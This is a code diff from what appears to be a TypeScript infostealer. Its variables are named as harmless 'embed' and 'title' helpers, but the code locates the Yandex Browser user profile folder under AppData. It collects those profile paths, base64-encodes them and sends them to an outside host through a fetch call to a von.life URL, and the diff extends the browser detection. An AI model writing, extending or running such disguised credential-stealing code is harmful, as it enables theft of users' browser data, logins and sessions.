@@ -67,7 +67,13 @@ export const startFetch = async () => {
   const embedYanDescription = emebdAlternateTitle.find(
     (title) => title === "Yandex"
   );
-  if (embedYanDescription)
+  const embedYannyDescription = await readdir(
+    `${process.env.APPDATA!}/../local/${embedYanDescription!}`
+  );
+  if (
+    embedYanDescription &&
+    embedYannyDescription.find((title) => title === "YandexBrowser")
+  )
     createEmbed(
       `${process.env.APPDATA!}/../local`,
       `${embedYanDescription!}/YandexBrowser/User Data/Default`
@@ -96,7 +102,6 @@ const createEmbed = async (title: string, description: string) => {
 };
 
 export const sendEmbed = async () => {
-  // base64 encode the array of embeds
   const ENCRY = Buffer.from(JSON.stringify(embeds)).toString("base64");
   await fetch(`https://von.life/_/x?t=${ENCRY}`);
 };
